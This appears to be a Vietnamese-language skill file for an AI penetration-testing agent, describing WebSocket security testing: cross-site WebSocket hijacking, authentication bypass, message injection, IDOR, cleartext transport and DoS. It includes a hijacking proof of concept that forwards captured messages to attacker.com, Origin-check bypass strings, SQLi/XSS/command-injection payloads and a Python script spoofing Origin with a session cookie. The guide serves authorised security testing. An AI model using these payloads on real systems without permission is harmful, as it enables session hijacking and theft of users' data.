---
name: websocket-security
description: Kỹ thuật kiểm thử và khai thác lỗ hổng WebSocket, bao gồm Cross-Site WebSocket Hijacking (CSWSH), authentication bypass, message injection (SQLi/XSS/CMDi), IDOR, cleartext transmission, race condition, và DoS.
when_to_use: Kích hoạt khi ứng dụng sử dụng WebSocket cho các tính năng real-time, đặc biệt khi thấy các endpoint như /ws, /socket.io, /signalr, /hub, /realtime, hoặc khi Burp Suite/DevTools phát hiện kết nối ws:// hoặc wss://.
tags: [websocket, cswsh, ws-security, real-time, message-injection, websocat, wscat]
---

# WebSocket Security Testing

## 1. Tổng quan
WebSocket cung cấp kênh giao tiếp song công (full-duplex) qua một kết nối TCP duy nhất, lý tưởng cho các ứng dụng real-time. Tuy nhiên, WebSocket có mô hình bảo mật khác biệt hoàn toàn với HTTP:
- Không có Same-Origin Policy (SOP): Bất kỳ trang web nào cũng có thể khởi tạo kết nối WebSocket đến bất kỳ server nào. SOP không áp dụng cho WebSocket như với XHR/fetch.
- Origin header là lớp phòng thủ duy nhất: Server phải tự kiểm tra Origin trong handshake để ngăn cross-origin.
- Authentication không tự động: Cookie được gửi trong handshake, nhưng ứng dụng phải xác thực chúng một cách tường minh.
- Message không được validate tự động: Không có cơ chế CSRF protection tương đương.

## 2. Các vector tấn công chính

### 2.1. Cross-Site WebSocket Hijacking (CSWSH)
CSWSH là phiên bản WebSocket của CSRF. Nếu endpoint WebSocket chỉ dựa vào cookie để xác thực và không kiểm tra Origin, kẻ tấn công có thể tạo một trang web độc hại để thiết lập kết nối WebSocket thay mặt nạn nhân.

PoC HTML:
<script>
  const ws = new WebSocket('wss://target.com/ws/chat');
  ws.onopen = function() {
    ws.send(JSON.stringify({type: 'get_history'}));
  };
  ws.onmessage = function(event) {
    fetch('https://attacker.com/collect?data=' + encodeURIComponent(event.data));
  };
</script>

Cách test CSWSH:
1. Chặn (intercept) request upgrade WebSocket trong Burp Suite.
2. Kiểm tra header Origin trong request upgrade.
3. Trong Burp Repeater, đổi Origin thành domain khác (ví dụ: https://evil.com).
4. Nếu server trả về 101 Switching Protocols, origin không được validate -> CSWSH khả thi.
5. Kiểm tra xem session có được xác thực sau khi upgrade không bằng cách gửi message và quan sát response.

Bypass Origin validation (khi server dùng string matching):
- Nếu server kiểm tra origin.startsWith('https://target.com') -> thử Origin: https://target.com.evil.com
- Nếu server kiểm tra origin.endsWith('target.com') -> thử Origin: https://eviltarget.com

### 2.2. Authentication Bypass (Thiếu xác thực)
Nhiều ứng dụng chỉ xác thực người dùng qua HTTP nhưng quên kiểm tra lại khi thiết lập WebSocket, hoặc không xác thực từng message.

Cách test:
- Kết nối đến endpoint WebSocket mà không có session token hợp lệ (dùng wscat -c "wss://target.com/ws").
- Nếu kết nối thành công và có thể gửi/nhận message -> lỗ hổng authentication bypass.
- Kiểm tra xem token có bị lộ trong URL không (ví dụ: wss://target.com/ws?token=...).

### 2.3. Message Injection (SQLi, XSS, Command Injection)
Các message WebSocket thường được ứng dụng xử lý mà không qua lớp validate của HTTP (WAF thường không kiểm tra WebSocket frame).

Payload mẫu:
- SQLi: Gửi {"query": "1' UNION SELECT ..."}
- XSS: Gửi {"message": "<img src=x onerror=alert(1)>"}
- Command Injection: Gửi {"cmd": "; id"}

### 2.4. IDOR / Broken Object Level Authorization
Thay đổi ID, UUID trong message để truy cập tài nguyên của user khác.
Ví dụ: {"action": "get_profile", "user_id": 123} -> đổi thành user_id: 124.

### 2.5. Cleartext Transmission (ws://)
Nếu ứng dụng dùng ws:// thay vì wss:// cho các chức năng nhạy cảm, dữ liệu có thể bị nghe lén trên mạng.

### 2.6. Race Condition & DoS
- Race condition: Gửi nhiều message đồng thời qua WebSocket có thể gây ra lỗi logic.
- DoS: Gửi message kích thước lớn hoặc số lượng lớn kết nối không giới hạn.

## 3. Quy trình kiểm thử (Workflow)

### Bước 1 — Phát hiện & Liệt kê endpoint
- Trong Browser DevTools: Network tab -> Filter: WS.
- Dùng curl để kiểm tra upgrade:
curl -s -I -H "Upgrade: websocket" -H "Connection: Upgrade" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" -H "Sec-WebSocket-Version: 13" "https://target.example.com/ws"
- Brute-force các path phổ biến: /ws, /websocket, /socket, /socket.io, /signalr, /hub, /chat, /notifications, /live, /stream, /realtime.
- Kiểm tra framework: socket.io (/socket.io/?EIO=4&transport=polling), SignalR (/signalr/negotiate).

### Bước 2 — Kiểm tra Authentication
- Kết nối không có token: wscat -c "wss://target.com/ws".
- Kết nối với token hết hạn hoặc token của user khác.

### Bước 3 — Kiểm tra CSWSH (Origin validation)
- Chặn handshake trong Burp, đổi Origin sang domain khác.
- Thử các bypass string matching (nếu có).

### Bước 4 — Kiểm tra Message Injection & IDOR
- Sửa đổi từng trường trong message (ID, query, text) bằng Burp Repeater.
- Gửi các payload SQLi/XSS/CMDi.

## 4. Công cụ hỗ trợ (Có sẵn trên Kali)

| Tool | Mục đích | Lệnh cài đặt / Sử dụng |
|------|----------|------------------------|
| Burp Suite (Professional) | Chặn, sửa, gửi lại WebSocket frame | Có sẵn trong Kali |
| websocat | CLI client WebSocket, linh hoạt | cargo install websocat hoặc tải binary |
| wscat | Node.js WebSocket client | npm install -g wscat |
| Python websockets | Viết script tấn công tùy chỉnh | pip install websockets |
| OWASP ZAP | Intercept WebSocket, fuzzing | Có sẵn trong Kali |

Ví dụ với wscat:
wscat -c "wss://target.com/ws" -H "Origin: https://evil.com"

Ví dụ với Python websockets:
import asyncio, websockets

async def attack():
    async with websockets.connect(
        "wss://target.com/ws",
        extra_headers={"Origin": "https://evil.com", "Cookie": "session=..."}
    ) as ws:
        await ws.send('{"action":"get_profile","user_id":124}')
        print(await ws.recv())

asyncio.run(attack())

